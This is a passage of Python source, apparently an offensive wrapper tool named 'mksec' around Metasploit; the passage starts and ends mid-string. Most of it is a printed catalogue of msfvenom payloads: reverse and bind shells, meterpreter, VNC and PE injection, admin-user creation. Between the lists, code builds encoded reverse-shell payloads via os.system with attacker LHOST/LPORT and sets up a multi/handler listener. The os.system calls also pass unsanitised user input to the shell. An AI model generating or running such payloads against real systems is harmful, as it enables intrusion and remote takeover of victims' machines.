Dll via a reflective loader (staged). Listen for a connection with UUID Support (Windows x86)\nwindows/vncinject/find_tag                          Inject a VNC Dll via a reflective loader (staged). Use an established connection\nwindows/vncinject/reverse_hop_http                  Inject a VNC Dll via a reflective loader (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.\nwindows/vncinject/reverse_http                      Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows wininet)\nwindows/vncinject/reverse_http_proxy_pstore         Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP\nwindows/vncinject/reverse_ipv6_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker over IPv6\nwindows/vncinject/reverse_nonx_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker (No NX)\nwindows/vncinject/reverse_ord_tcp                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\nwindows/vncinject/reverse_tcp                       Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\nwindows/vncinject/reverse_tcp_allports              Inject a VNC Dll via a reflective loader (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/vncinject/reverse_tcp_dns                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\nwindows/vncinject/reverse_tcp_rc4                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\nwindows/vncinject/reverse_tcp_rc4_dns               Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\nwindows/vncinject/reverse_tcp_uuid                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker with UUID Support\nwindows/vncinject/reverse_winhttp                   Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows winhttp)\nwindows/x64/exec                                    Execute an arbitrary command (Windows x64)\nwindows/x64/loadlibrary                             Load an arbitrary x64 library path\nwindows/x64/messagebox                              Spawn a dialog via MessageBox using a customizable title, text & icon\nwindows/x64/meterpreter/bind_ipv6_tcp               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for an IPv6 connection (Windows x64)\nwindows/x64/meterpreter/bind_ipv6_tcp_uuid          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for an IPv6 connection with UUID Support (Windows x64)\nwindows/x64/meterpreter/bind_named_pipe             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a pipe connection (Windows x64)\nwindows/x64/meterpreter/bind_tcp                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection (Windows x64)\nwindows/x64/meterpreter/bind_tcp_rc4                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/x64/meterpreter/bind_tcp_uuid               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection with UUID Support (Windows x64)\nwindows/x64/meterpreter/reverse_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP (Windows x64 wininet)\nwindows/x64/meterpreter/reverse_https               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP (Windows x64 wininet)\nwindows/x64/meterpreter/reverse_named_pipe          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker via a named pipe pivot\nwindows/x64/meterpreter/reverse_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker (Windows x64)\nwindows/x64/meterpreter/reverse_tcp_rc4             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/x64/meterpreter/reverse_tcp_uuid            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker with UUID Support (Windows x64)\nwindows/x64/meterpreter/reverse_winhttp             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP (Windows x64 winhttp)\nwindows/x64/meterpreter/reverse_winhttps            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTPS (Windows x64 winhttp)\nwindows/x64/meterpreter_bind_named_pipe             Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/meterpreter_bind_tcp                    Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/meterpreter_reverse_http                Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/meterpreter_reverse_https               Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/meterpreter_reverse_ipv6_tcp            Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/meterpreter_reverse_tcp                 Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/peinject/bind_ipv6_tcp                  Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Listen for an IPv6 connection (Windows x64)\nwindows/x64/peinject/bind_ipv6_tcp_uuid             Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Listen for an IPv6 connection with UUID Support (Windows x64)\nwindows/x64/peinject/bind_named_pipe                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Listen for a pipe connection (Windows x64)\nwindows/x64/peinject/bind_tcp                       Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Listen for a connection(Windows x64)\nwindows/x64/peinject/bind_tcp_rc4                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Connect back to the attacker\nwindows/x64/peinject/bind_tcp_uuid                  Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Listen for a connectionwith UUID Support (Windows x64)\nwindows/x64/peinject/reverse_named_pipe             Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Connect back to the attacker via a named pipe pivot\nwindows/x64/peinject/reverse_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Connect back to the attacker (Windows x64)\nwindows/x64/peinject/reverse_tcp_rc4                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Connect back to the attacker\nwindows/x64/peinject/reverse_tcp_uuid               Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Connect back to the attacker with UUID Support (Windows x64)\nwindows/x64/pingback_reverse_tcp                    Connect back to attacker and report UUID (Windows x64)\nwindows/x64/powershell_bind_tcp                     Listen for a connection and spawn an interactive powershell session\nwindows/x64/powershell_reverse_tcp                  Listen for a connection and spawn an interactive powershell session\nwindows/x64/shell/bind_ipv6_tcp                     Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)\nwindows/x64/shell/bind_ipv6_tcp_uuid                Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)\nwindows/x64/shell/bind_named_pipe                   Spawn a piped command shell (Windows x64) (staged). Listen for a pipe connection (Windows x64)\nwindows/x64/shell/bind_tcp                          Spawn a piped command shell (Windows x64) (staged). Listen for a connection (Windows x64)\nwindows/x64/shell/bind_tcp_rc4                      Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker\nwindows/x64/shell/bind_tcp_uuid                     Spawn a piped command shell (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)\nwindows/x64/shell/reverse_tcp                       Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)\nwindows/x64/shell/reverse_tcp_rc4                   Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker\nwindows/x64/shell/reverse_tcp_uuid                  Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)\nwindows/x64/shell_bind_tcp                          Listen for a connection and spawn a command shell (Windows x64)\nwindows/x64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell (Windows x64)\nwindows/x64/vncinject/bind_ipv6_tcp                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)\nwindows/x64/vncinject/bind_ipv6_tcp_uuid            Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)\nwindows/x64/vncinject/bind_named_pipe               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a pipe connection (Windows x64)\nwindows/x64/vncinject/bind_tcp                      Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection (Windows x64)\nwindows/x64/vncinject/bind_tcp_rc4                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker\nwindows/x64/vncinject/bind_tcp_uuid                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)\nwindows/x64/vncinject/reverse_http                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)\nwindows/x64/vncinject/reverse_https                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)\nwindows/x64/vncinject/reverse_tcp                   Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker (Windows x64)\nwindows/x64/vncinject/reverse_tcp_rc4               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker\nwindows/x64/vncinject/reverse_tcp_uuid              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)\nwindows/x64/vncinject/reverse_winhttp               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winhttp)\nwindows/x64/vncinject/reverse_winhttps              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTPS (Windows x64 winhttp)\n""")
                elif "run" == uinput.lower():
                    os.system("sudo msfvenom -p " + payload.strip() + " LHOST=" + host.strip() + " LPORT=" + port.strip() + " -e x86/shikata_ga_nai -i 6 -f " + format.strip() + " -o " + output.strip())
                elif "run -f" == uinput.lower():
                    os.system("cd /opt/metasploit-framework/ && sudo ./msfvenom -p " + payload.strip() + " LHOST=" + host.strip() + " LPORT=" + port.strip() + " -e x86/shikata_ga_nai -i 6 -f " + format.strip() + " -o " + output.strip())

        def PayloadListener():
            payload = "         windows/meterpreter/reverse_tcp          "
            host = "                       <IP>                       "
            port = "                       4444                       "
            youriface = os.popen('ip addr').read().split("2:")[1].split(":")[0]
            ipv4 = os.popen('ip addr show {}'.format(youriface)).read().split("inet ")[1].split("/")[0]
            while 1:
                uinput = input("\x1b[1m\033[36m[mksec]\033[36m[listener]\033[37m\x1b[0m ")
                UserInputs(uinput+"exp")
                if uinput.lower() == "info":
                    print("\x1b[1m\x1b[33mEN:\x1b[37mPayload is a listening tool. Edited by mksec using the 'exploit/multi/handler' module in the Metasploit tool. \x1b[36m'run'\x1b[37m command does not work, try with \x1b[36m'run -f'\x1b[37m (-f : --force). \n\x1b[33mTR:\x1b[37mPayload dinleme aracıdır. Metasploit aracı içerisindeki 'exploit/multi/handler' modülünü kullanarak mksec tarafından düzenlenmiştir. \x1b[36m'run'\x1b[37m komutu çalışmazsa \x1b[36m'run -f'\x1b[37m (-f : --force) ile deneyiniz.")
                elif uinput.lower() == "options":
                    print("\x1b[1m\x1b[33mOption\x1b[37m                     \x1b[33mCurrent Setting\x1b[37m                     \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m                    \x1b[33m===============\x1b[37m                     \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nPAYLOAD{}         YES          Type '--list payloads' or '-lp' to see payloads \x1b[32mDefault: windows/meterpreter/reverse_tcp\x1b[37m\nLHOST  {}         YES          Your IP address = \x1b[32m{}\x1b[37m\nLPORT  {}         YES          Type in port \x1b[32mDefault = 4444\x1b[37m".format(payload,host,ipv4,port))
                elif "set payload" in uinput.lower():
                    payload = uinput
                    payload = payload.replace("set payload ","").replace("set PAYLOAD ","").replace("SET payload ","").replace("SET PAYLOAD ","").center(50)
                elif "set lhost" in uinput.lower():
                    host = uinput
                    host = host.replace("set lhost ","").replace("set LHOST ","").replace("SET lhost ","").replace("SET LHOST ","").center(50)
                elif "set lport" in uinput.lower():
                    port = uinput
                    port = port.replace("set lport ","").replace("set LPORT ","").replace("SET lport ","").replace("SET LPORT ","").center(50)
                elif "--list payload" in uinput or "-lp" == uinput.lower():
                    print("""\x1b[1m\x1b[33mFramework Payloads (592 total)\x1b[37m\n\x1b[33m==================================================\x1b[37m\n\n\x1b[33mName\x1b[37m                                                \x1b[33mDescription\x1b[37m\n\x1b[33m----\x1b[37m                                                \x1b[33m-----------\x1b[37m\naix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell\naix/ppc/shell_find_port                             Spawn a shell on an established connection\naix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)\naix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nandroid/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP\nandroid/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS\nandroid/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager\nandroid/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell\nandroid/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell\nandroid/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell\nandroid/shell/reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP\nandroid/shell/reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS\nandroid/shell/reverse_tcp                           Spawn a piped command shell (sh). Connect back stager\napple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)\napple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)\napple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)\napple_ios/aarch64/shell_reverse_tcp                 Connect back to attacker and spawn a command shell\napple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)\napple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)\napple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)\nbsd/sparc/shell_bind_tcp                            Listen for a connection and spawn a command shell\nbsd/sparc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nbsd/vax/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nbsd/x64/exec                                        Execute an arbitrary command\nbsd/x64/shell_bind_ipv6_tcp                         Listen for a connection and spawn a command shell over IPv6\nbsd/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port\nbsd/x64/shell_bind_tcp_small                        Listen for a connection and spawn a command shell\nbsd/x64/shell_reverse_ipv6_tcp                      Connect back to attacker and spawn a command shell over IPv6\nbsd/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nbsd/x64/shell_reverse_tcp_small                     Connect back to attacker and spawn a command shell\nbsd/x86/exec                                        Execute an arbitrary command\nbsd/x86/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service\nbsd/x86/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service\nbsd/x86/shell/bind_ipv6_tcp                         Spawn a command shell (staged). Listen for a connection over IPv6\nbsd/x86/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection\nbsd/x86/shell/find_tag                              Spawn a command shell (staged). Use an established connection\nbsd/x86/shell/reverse_ipv6_tcp                      Spawn a command shell (staged). Connect back to the attacker over IPv6\nbsd/x86/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker\nbsd/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell\nbsd/x86/shell_bind_tcp_ipv6                         Listen for a connection and spawn a command shell over IPv6\nbsd/x86/shell_find_port                             Spawn a shell on an established connection\nbsd/x86/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)\nbsd/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nbsd/x86/shell_reverse_tcp_ipv6                      Connect back to attacker and spawn a command shell over IPv6\nbsdi/x86/shell/bind_tcp                             Spawn a command shell (staged). Listen for a connection\nbsdi/x86/shell/reverse_tcp                          Spawn a command shell (staged). Connect back to the attacker\nbsdi/x86/shell_bind_tcp                             Listen for a connection and spawn a command shell\nbsdi/x86/shell_find_port                            Spawn a shell on an established connection\nbsdi/x86/shell_reverse_tcp                          Connect back to attacker and spawn a command shell\ncmd/mainframe/apf_privesc_jcl                       (Elevate privileges for user. Adds SYSTEM SPECIAL and BPX.SUPERUSER to user profile. Does this by using an unsecured/updateable APF authorized library (APFLIB) and updating the user's ACEE using this program/library. Note: This privesc only works with z/OS systems using RACF, no other ESM is supported.)\ncmd/mainframe/bind_shell_jcl                        Provide JCL which creates a bind shell This implmentation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.\ncmd/mainframe/generic_jcl                           Provide JCL which can be used to submit a job to JES2 on z/OS which will exit and return 0. This can be used as a template for other JCL based payloads\ncmd/mainframe/reverse_shell_jcl                     Provide JCL which creates a reverse shell This implementation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.\ncmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWKcmd/unix/bind_busybox_telnetd                       Listen for a connection and spawn a command shell via BusyBox telnetdcmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)cmd/unix/bind_jjs                                   Listen for a connection and spawn a command shell via jjs\ncmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua\ncmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat\ncmd/unix/bind_netcat_gaping                         Listen for a connection and spawn a command shell via netcat\ncmd/unix/bind_netcat_gaping_ipv6                    Listen for a connection and spawn a command shell via netcat\ncmd/unix/bind_nodejs                                Continually listen for a connection and spawn a command shell via nodejs\ncmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl\ncmd/unix/bind_perl_ipv6                             Listen for a connection and spawn a command shell via perl\ncmd/unix/bind_r                                     Continually listen for a connection and spawn a command shell via R\ncmd/unix/bind_ruby                                  Continually listen for a connection and spawn a command shell via Ruby\ncmd/unix/bind_ruby_ipv6                             Continually listen for a connection and spawn a command shell via Ruby\ncmd/unix/bind_socat_udp                             Creates an interactive shell via socat\ncmd/unix/bind_stub                                  Listen for a connection and spawn a command shell (stub only, no payload)\ncmd/unix/bind_zsh                                   Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.\ncmd/unix/generic                                    Executes the supplied command\ncmd/unix/interact                                   Interacts with a shell on an established socket connection\ncmd/unix/pingback_bind                              Accept a connection, send a UUID, then exit\ncmd/unix/pingback_reverse                           Creates a socket, send a UUID, then exit\ncmd/unix/reverse                                    Creates an interactive shell through two inbound connections\ncmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK\ncmd/unix/reverse_bash                               Creates an interactive shell via bash's builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bashwithout the /dev/tcp feature.\ncmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the '-z' option included on some systems to encrypt using SSL.\ncmd/unix/reverse_bash_udp                           Creates an interactive shell via bash's builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bashwithout the /dev/udp feature.\ncmd/unix/reverse_jjs                                Connect back and create a command shell via jjs\ncmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn't usually installed by default.\ncmd/unix/reverse_lua                                Creates an interactive shell via Lua\ncmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode\ncmd/unix/reverse_netcat                             Creates an interactive shell via netcat\ncmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat\ncmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs\ncmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections\ncmd/unix/reverse_perl                               Creates an interactive shell via perl\ncmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL\ncmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL\ncmd/unix/reverse_python                             Connect back and create a command shell via Python\ncmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.\ncmd/unix/reverse_r                                  Connect back and create a command shell via R\ncmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby\ncmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL\ncmd/unix/reverse_socat_udp                          Creates an interactive shell via socat\ncmd/unix/reverse_ssh                                Connect back and create a command shell via SSH\ncmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via "-z" option\ncmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)\ncmd/unix/reverse_tclsh                              Creates an interactive shell via Tclsh\ncmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.\ncmd/windows/adduser                                 Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)\ncmd/windows/bind_lua                                Listen for a connection and spawn a command shell via Lua\ncmd/windows/bind_perl                               Listen for a connection and spawn a command shell via perl (persistent)\ncmd/windows/bind_perl_ipv6                          Listen for a connection and spawn a command shell via perl (persistent)\ncmd/windows/bind_ruby                               Continually listen for a connection and spawn a command shell via Ruby\ncmd/windows/download_eval_vbs                       Downloads a file from an HTTP(S) URL and executes it as a vbs script. Use it to stage a vbs encoded payload from a short command line.\ncmd/windows/download_exec_vbs                       Download an EXE from an HTTP(S) URL and execute it\ncmd/windows/generic                                 Executes the supplied command\ncmd/windows/powershell_bind_tcp                     Interacts with a powershell session on an established socket connection\ncmd/windows/powershell_reverse_tcp                  Interacts with a powershell session on an established socket connection\ncmd/windows/reverse_lua                             Creates an interactive shell via Lua\ncmd/windows/reverse_perl                            Creates an interactive shell via perl\ncmd/windows/reverse_powershell                      Connect back and create a command shell via Powershell\ncmd/windows/reverse_ruby                            Connect back and create a command shell via Ruby\nfirefox/exec                                        This module runs a shell command on the target OS without touching the disk. On Windows, this command will flash the command prompt momentarily. This can be avoided by setting WSCRIPT to true, which drops a jscript "launcher" to disk that hides the prompt.\nfirefox/shell_bind_tcp                              Creates an interactive shell via Javascript with access to Firefox's XPCOM API\nfirefox/shell_reverse_tcp                           Creates an interactive shell via Javascript with access to Firefox's XPCOM API\ngeneric/custom                                      Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR.\ngeneric/debug_trap                                  Generate a debug trap in the target process\ngeneric/shell_bind_tcp                              Listen for a connection and spawn a command shell\ngeneric/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\ngeneric/tight_loop                                  Generate a tight loop in the target process\njava/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell\njava/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell\njava/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection\njava/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP\njava/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS\njava/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager\njava/shell/bind_tcp                                 Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection\njava/shell/reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager\njava/shell_reverse_tcp                              Connect back to attacker and spawn a command shell\nlinux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker\nlinux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)\nlinux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)\nlinux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)\nlinux/aarch64/shell/reverse_tcp                     dup2 socket in x12, then execve. Connect back to the attacker\nlinux/aarch64/shell_reverse_tcp                     Connect back to attacker and spawn a command shell\nlinux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)\nlinux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)\nlinux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)\nlinux/armbe/shell_bind_tcp                          Listen for a connection and spawn a command shell\nlinux/armle/adduser                                 Create a new user with UID 0\nlinux/armle/exec                                    Execute an arbitrary command\nlinux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection\nlinux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker\nlinux/armle/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)\nlinux/armle/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)\nlinux/armle/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)\nlinux/armle/shell/bind_tcp                          dup2 socket in r12, then execve. Listen for a connection\nlinux/armle/shell/reverse_tcp                       dup2 socket in r12, then execve. Connect back to the attacker\nlinux/armle/shell_bind_tcp                          Connect to target and spawn a command shell\nlinux/armle/shell_reverse_tcp                       Connect back to attacker and spawn a command shell\nlinux/mips64/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\nlinux/mips64/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)\nlinux/mips64/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsbe/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes.\nlinux/mipsbe/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker\nlinux/mipsbe/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsbe/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsbe/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsbe/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes or executing other payloads that rely on initial startup procedures.\nlinux/mipsbe/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker\nlinux/mipsbe/shell_bind_tcp                         Listen for a connection and spawn a command shell\nlinux/mipsbe/shell_reverse_tcp                      Connect back to attacker and spawn a command shell\nlinux/mipsle/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on targets with extremely limited buffer space.\nlinux/mipsle/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker\nlinux/mipsle/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsle/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload 